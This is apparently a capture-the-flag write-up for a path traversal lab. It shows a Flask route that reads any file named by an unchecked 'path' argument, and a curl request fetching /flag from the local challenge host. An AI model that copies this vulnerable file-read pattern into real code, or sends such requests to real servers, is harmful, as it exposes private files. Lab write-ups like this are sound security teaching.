# Level 1

we are given with a task to `Exploit a path traversal vulnerability`

they provided a remote desktop which we can ssh or we can use the web interface to interact. I used the web interface to interact with the machine ü¶•i'm lazy here.

they also provided us with challenge source code which is in `python` üêç `flask`

```python copy
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```
This is pretty obvious that it contains a path traversal vulnerability.

looking into the code we can see that it takes the `path` argument from the request and reads the file and returns the content of the file.
```python {2,4}
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

so we can read any file in the system by passing the path as an argument to the request.

```bash
hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag
